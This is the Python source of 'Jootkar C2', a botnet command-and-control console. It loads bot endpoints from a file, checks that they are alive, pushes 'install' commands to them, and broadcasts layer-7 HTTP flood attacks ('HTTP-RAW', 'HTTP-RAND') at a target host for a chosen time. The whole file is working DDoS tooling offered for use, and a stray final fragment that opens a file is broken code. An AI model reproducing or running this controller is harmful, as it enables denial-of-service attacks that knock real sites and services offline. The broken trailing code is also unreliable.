import requests
from time import sleep
import os
import ctypes
from threading import Thread

bots = []


def def_methods():
    os.system("cls")
    print("●LAYER7 METHODS●".center(90)) 
    print("")
    print("●HTTP-RAW  | .1 <url> <time>".center(90))
    print("●HTTP-RAND | .2 <url> <time>".center(90))
    print("")

def set_console_title(title):
    try:
        ctypes.windll.kernel32.SetConsoleTitleW(title)
    except:
        pass

def check(bot):
    try:
        r = requests.get(bot + "?ping=qwe", timeout=1)
        if "pong" in r.text:
            bots.append(bot)
            print("[+] " + bot + " ok")
            set_console_title(f"Jootkar C2 | bots: {str(len(bots))}")
    except:
        print("[-] " + bot + " no")

def get_bots():
    global bots
    bots = []
    list_bots = open("bots.txt").read().splitlines()
    for bot in list_bots:
        Thread(target=check, args=(bot,)).start()
    sleep(5)

def send_request(url, data, timeout):
    try:
        requests.post(url, data=data, timeout=timeout)
    except:
        pass



def install_bots():
    global bots
    for bot in bots:
        try:
            print("[+] " + bot + " all methods has been installed")
            data = {"stop":"1"}
            Thread(target=send_request, args=(bot + "?install=1", data, 1,)).start()
        except:
            pass




def stop():
    global bots
    for bot in bots:
        try:
            data = {"stop":"1"}
            Thread(target=send_request, args=(bot, data, 1,)).start()
        except:
            pass
    print("all attacks has been stopped")



def http_raw(host, time):
    global bots
    for bot in bots:
        try:
            data = {"method":'1', 
            "host":host, 
            "time":time}
            Thread(target=send_request, args=(bot, data, 1,)).start()
        except:
            pass

def http_rand(host, time):
    global bots
    for bot in bots:
        try:
            data = {"method":'2', 
            "host":host, 
            "time":time}
            Thread(target=send_request, args=(bot, data, 1,)).start()
        except:
            pass

def get_bot_list():
    global bots
    for bot in bots:
        print("[+] " + bot)

def main():
    while True:
        cmd = input("root@Jootkar C2:~$ ").lower()

        if cmd == "bots":
            get_bots()

        elif cmd == "list":
            get_bot_list()

        elif cmd == "help":
            def_methods()

        elif cmd == "cls":
            os.system('cls')
            print("") 
            print("") 
            print("●Jootkar C2 LAYER7●".center(90))  
            print("")                                                       
            print("")

        elif cmd == "stop":
            stop()

        elif cmd == "install":
            install_bots()

        elif cmd == "refresh":
            global bots
            bots = []
            set_console_title(f"Jootkar C2 | Bots: 0")
            get_bots()


        elif cmd.startswith(".1 "):
            try:
                cmd = cmd.replace(".1 ", '')
                host = cmd.split(" ")[0]
                time = cmd.split(" ")[1]
                http_raw(host, time)
                print("[+]successfully broadcast to all Jootkar C2 Service ")
            except:
                print("usage: .1 <host> <time>")

        elif cmd.startswith(".2 "):
            try:
                cmd = cmd.replace(".2 ", '')
                host = cmd.split(" ")[0]
                time = cmd.split(" ")[1]
                http_rand(host, time)
                print("[+]successfully broadcast to all Jootkar C2 Service ")
            except:
                print("usage: .2 <host> <time>")

if __name__ == '__main__':
    set_console_title(f"Jootkar C2: | bots : 0")
    print("") 
    print("●Jootkar C2 LAYER7●".center(90))
    print("")                                                       
    print("")
    main()



file = open("cenz.txt , r")
file = file.read()
print(file)


